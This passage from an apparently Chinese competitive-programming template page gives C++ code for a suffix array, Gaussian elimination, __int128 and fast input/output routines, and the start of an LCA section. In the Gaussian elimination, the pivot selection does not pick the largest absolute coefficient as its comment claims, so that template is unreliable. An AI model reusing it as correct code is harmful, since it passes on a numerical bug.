punctuation">;</span> height<span class="token punctuation">[</span>rank<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">?</span> k<span class="token operator">--</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> sa<span class="token punctuation">[</span>rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> r<span class="token punctuation">[</span>i <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>j <span class="token operator">+</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//若k>0，从k-1开始找最长公共前缀。</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><em>2</em>. 后缀数组模板（倍增）<br><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span> <span class="token operator">=</span> <span class="token keyword">uint32_t</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">__SA</span><span class="token punctuation">&#123;</span>    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">S</span><span class="token operator">></span>    <span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span>S <span class="token operator">&amp;&amp;</span>r<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> r<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">[</span>a <span class="token operator">+</span> l<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>b <span class="token operator">+</span> l<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">S</span><span class="token operator">></span>    <span class="token keyword">void</span> <span class="token function">_sa</span><span class="token punctuation">(</span>S <span class="token operator">&amp;&amp;</span>s<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> n<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> m<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">++</span>n<span class="token punctuation">;</span>        sa <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        rk <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        ht <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">auto</span> <span class="token operator">&amp;&amp;</span>x <span class="token operator">=</span> rk<span class="token punctuation">;</span>        <span class="token keyword">auto</span> <span class="token operator">&amp;&amp;</span>y <span class="token operator">=</span> ht<span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token keyword">auto</span> wv <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token keyword">auto</span> ws <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> p<span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            ws<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            ws<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            ws<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> ws<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>            sa<span class="token punctuation">[</span><span class="token operator">--</span>ws<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">,</span> m <span class="token operator">=</span> p<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> n <span class="token operator">-</span> j<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                y<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> j<span class="token punctuation">)</span>                    y<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> j<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                wv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                ws<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                ws<span class="token punctuation">[</span>wv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                ws<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> ws<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>                sa<span class="token punctuation">[</span><span class="token operator">--</span>ws<span class="token punctuation">[</span>wv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span>sa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                x<span class="token punctuation">[</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cmp</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> sa<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">?</span> p <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">:</span> p<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">public</span><span class="token operator">:</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> sa<span class="token punctuation">,</span> rk<span class="token punctuation">,</span> ht<span class="token punctuation">;</span>    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">S</span><span class="token operator">></span>    <span class="token function">__SA</span><span class="token punctuation">(</span>S <span class="token operator">&amp;&amp;</span>s<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> n<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> m <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">_sa</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> n<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            rk<span class="token punctuation">[</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> ht<span class="token punctuation">[</span>rk<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">?</span> k<span class="token operator">--</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> j <span class="token operator">=</span> sa<span class="token punctuation">[</span>rk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>j <span class="token operator">+</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">get_sa</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> sa<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">get_rk</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> rk<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">get_ht</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> ht<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></p><h3 id="23-高斯消元"><a href="#23-高斯消元" class="headerlink" title="23. 高斯消元"></a>23. 高斯消元</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">guass</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读入系数</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//读入值</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> pivot <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">//选择一个当前位置系数绝对值最大的调换过来，防止误差</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> B<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> eps<span class="token punctuation">)</span>                pivot <span class="token operator">=</span> j<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span> <span class="token comment">//交换操作，要将所有的全部交换过来</span>            <span class="token keyword">double</span> t <span class="token operator">=</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> B<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            B<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> eps<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span> <span class="token comment">//如果该位置系数等于零，则0x=a，一定无解</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No Solution\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/=</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//将该位的系数变为1</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> j<span class="token punctuation">)</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                    B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-=</span> B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//将其他方程用加减法减去系数值   </span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2lf\n"</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//最后输出结果。</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="24-小技巧"><a href="#24-小技巧" class="headerlink" title="24. 小技巧"></a>24. 小技巧</h3><h4 id="24-1-int-128输入输出"><a href="#24-1-int-128输入输出" class="headerlink" title="24.1 __int 128输入输出"></a>24.1 __int 128输入输出</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp">__int128_t <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __int128_t x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> f <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>ch<span class="token operator">&lt;</span><span class="token char">'0'</span><span class="token operator">||</span>ch<span class="token operator">></span><span class="token char">'9'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token char">'-'</span><span class="token punctuation">)</span>f<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        ch<span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>ch<span class="token operator">>=</span><span class="token char">'0'</span><span class="token operator">&amp;&amp;</span>ch<span class="token operator">&lt;=</span><span class="token char">'9'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        x<span class="token operator">=</span>x<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>ch<span class="token operator">-</span><span class="token char">'0'</span><span class="token punctuation">;</span>ch<span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> x<span class="token operator">*</span>f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span>__int128 x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        x<span class="token operator">=</span><span class="token operator">-</span>x<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span>        <span class="token function">write</span><span class="token punctuation">(</span>x<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">10</span><span class="token operator">+</span><span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="24-2-读入挂"><a href="#24-2-读入挂" class="headerlink" title="24.2 读入挂"></a>24.2 读入挂</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> v <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> f <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">char</span> c <span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span> c <span class="token operator">&lt;</span> <span class="token number">48</span> <span class="token operator">||</span> <span class="token number">57</span> <span class="token operator">&lt;</span> c <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">==</span><span class="token char">'-'</span><span class="token punctuation">)</span> f <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">&lt;=</span> c <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> v <span class="token operator">=</span> v<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>c<span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> v<span class="token operator">*</span>f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Out</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//输出外挂  </span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token operator">-</span>a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span>       <span class="token function">Out</span><span class="token punctuation">(</span>a <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">putchar</span><span class="token punctuation">(</span>a <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  </code></pre><h3 id="25-LCA"><a href="#25-LCA" class="headerlink" title="25. LCA"></a>25. LCA</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">int</span> N<span class="token punctuation">,</span> M<span class="token punctuation">,</span> S<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token 